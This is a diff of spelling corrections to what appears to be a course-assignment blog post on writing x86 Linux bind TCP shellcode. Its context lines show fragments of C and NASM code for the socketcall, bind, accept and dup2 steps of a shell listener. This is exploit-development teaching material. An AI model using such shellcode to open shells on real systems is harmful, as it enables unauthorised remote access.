@@ -25,7 +25,7 @@ image: /assets/img/post/slae32/slae32.png
 
 
 # What is a Bind Shell?
-Bind TCP opens up a port on the victim system. If an attacker could exploit a vulnerability on the victim system, she can implant a bind shell and connect to it from the remote attaking box. However, due to a firewall and detection controls, reverse TCP shell is preferrable over bind TCP shell thesedays.
+Bind TCP opens up a port on the victim system. If an attacker could exploit a vulnerability on the victim system, she can implant a bind shell and connect to it from the remote attacking box. However, due to a firewall and detection controls, reverse TCP shell is preferable over bind TCP shell these days.
 
 ![image](/assets/img/post/slae32/assignment1/01.png)
 
@@ -66,7 +66,7 @@ int main()
 	// 3) Listen() Syscall (sys_listen 4)
 	listen(sockfd, 0);
 
-	// 4) Accetpt() Syscall (sys_accept 5)
+	// 4) Accept() Syscall (sys_accept 5)
 	acceptfd = accept(sockfd, NULL, NULL);
 
 	// 5) Dup2() Syscall
@@ -104,7 +104,7 @@ For our Bind TCP Shell shellcode, we need to use all those `syscalls`:
 
 ## Syscall + Function Calls
 
-First, we need to collect arguemnts for `socketcall()` as well as other `syscalls`. 
+First, we need to collect arguements for `socketcall()` as well as other `syscalls`. 
 
 > **NOTE**: socketcall()  is  a  common  kernel  entry point for the socket system calls.
 
@@ -209,7 +209,7 @@ Let's create the `bind()` shellcode:
 mov al, 0x66		; socketcall = 102
 mov bl, 0x2		; #define SYS_BIND	2
 push 0x10		; sizeof(addr) = 10
-push esi		; ESI = Server Address stuct
+push esi		; ESI = Server Address struct
 push edi		; EDI = sockfd
 mov ecx, esp		; Move stack pointer to ECX
 int 0x80		; Execute SYS_BIND
@@ -257,7 +257,7 @@ mov edi, eax
 Let's create the `dup2()` shellcode:
 
 ```s
-; 5) Dup2 - Input and Output Redriection
+; 5) Dup2 - Input and Output Redirection
 ; dup2(acceptfd, 0);	// stdin
 ; dup2(acceptfd, 1);	// stdout
 ; dup2(acceptfd, 2);	// stderr
@@ -298,7 +298,7 @@ int 0x80		; Execute SYS_EXECVE
 
 ## Final Shellcode (bing-tcp-shell.nasm)
 
-Let's put everything togeter and test the shellcode.
+Let's put everything together and test the shellcode.
 
 ```s
 global _start
@@ -342,7 +342,7 @@ mov esi, esp	; Move stack pointer to ESI
 mov al, 0x66		; socketcall = 102
 mov bl, 0x2		; #define SYS_BIND	2
 push 0x10		; sizeof(addr) = 10
-push esi		; ESI = Server Address stuct
+push esi		; ESI = Server Address struct
 push edi		; EDI = sockfd
 mov ecx, esp		; Move stack pointer to ECX
 int 0x80		; Execute SYS_BIND
@@ -369,7 +369,7 @@ mov ecx, esp		; Move stack pointer to ECX
 int 0x80		; Execute SYS_ACCEPT
 mov edi, eax
 
-; 5) Dup2 - Input and Output Redriection
+; 5) Dup2 - Input and Output Redirection
 ; dup2(acceptfd, 0);	// stdin
 ; dup2(acceptfd, 1);	// stdout
 ; dup2(acceptfd, 2);	// stderr
